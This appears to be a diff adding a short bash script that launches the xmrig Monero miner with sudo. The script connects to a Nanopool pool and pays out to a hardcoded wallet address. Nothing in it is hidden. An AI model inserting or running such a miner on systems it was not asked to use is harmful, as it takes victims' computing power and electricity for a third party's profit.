@@ -1,0 +1,3 @@
+#!/bin/bash
+
+sudo xmrig -o xmr-us-east1.nanopool.org:14433 -u 439Rh5ZfRz9HtkphABsMMd8i7NLvL7uiSXdExjpCZ1gVYTpWFTmqZuFfaTawiuZEfR3berJhsUvsV9CJD4XJxY3P3VtXSWM --tls --coin monero
